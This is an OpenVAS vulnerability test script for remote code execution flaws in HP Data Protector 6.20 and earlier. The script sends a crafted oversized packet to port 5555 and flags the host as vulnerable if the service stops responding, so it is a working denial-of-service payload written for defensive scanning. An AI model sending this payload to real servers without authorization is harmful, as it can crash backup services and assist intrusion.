###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hp_data_protector_mult_code_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# HP Data Protector Multiple Remote Code Execution Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_solution = "No solution or patch is available as of 30th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://www8.hp.com/us/en/software/software-product.html?compURI=tcm:245-936920&x=1

  Workaround: Apply workaround steps mentioned.
  1. Upgrade to Data Protector A.06.20 or subsequent.
  2. Enable encrypted control communication services on cell server
  and all clients in cell.";

tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  code and lead to denial of service conditions.
  Impact Level: Application.";
tag_affected = "HP Data Protector 6.20 and prior.";
tag_insight = "Multiple flaws are due to error in 'data protector inet' service,
  command. which allows remote remote attackers to execute arbitrary code.";
tag_summary = "This host is installed with HP Data Protector and is prone to
  multiple remote code execution vulnerabilities.";

if(description)
{
  script_id(902454);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_cve_id("CVE-2011-1865", "CVE-2011-1514", "CVE-2011-1515", "CVE-2011-1866");
  script_bugtraq_id(48486);
  script_name("HP Data Protector Multiple Remote Code Execution Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check the remote code execution vulnerability in HP Data Protector");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("General");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_keys("Hp/data_protector/installed");
  script_require_ports("Services/hp_openview_dataprotector", 5555);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "solution" , value : tag_solution);
  }
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17458/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Jun/552");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Jun/551");
  exit(0);
}

## HP Data Protector default port
port = 5555;

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

##  Open tcp socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

# Data Protector can take some time to return its header
response = recv(socket:soc, length:4096, timeout:20);

## Confirm the application
if("HP Data Protector" >!< response){
  exit(0);
}

close(soc);

## reopen the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct attack string (header)
headdata = raw_string(0x00, 0x00, 0x27, 0xca, 0xff, 0xfe, 0x32,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x00,
                0x00, 0x20, 0x00);

## Construct attack string (actuall data to be send)
middata = crap(data:raw_string(0x61), length: 10001);

## Construct attack string (post data)
lastdata = raw_string(0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00, 0x20, 0x00, 0x61,
                0x00, 0x00, 0x00, 0x20, 0x00, 0x61, 0x00, 0x00,
                0x00, 0x20, 0x00, 0x61, 0x00, 0x00, 0x00, 0x20,
                0x00, 0x61, 0x00, 0x00, 0x00);

req = headdata + middata +lastdata;

## send the data
send(socket:soc, data:req);

close(soc);

## wait for 5 sec
sleep(5);

soc = open_sock_tcp(port);
if(!soc)
{
 security_hole(port);
 exit(0);
}
else
{
  response = recv(socket:soc, length:4096, timeout:20);
  if("HP Data Protector" >!< response)
  {
    security_hole(port);
    exit(0);
  }
}

close(soc);
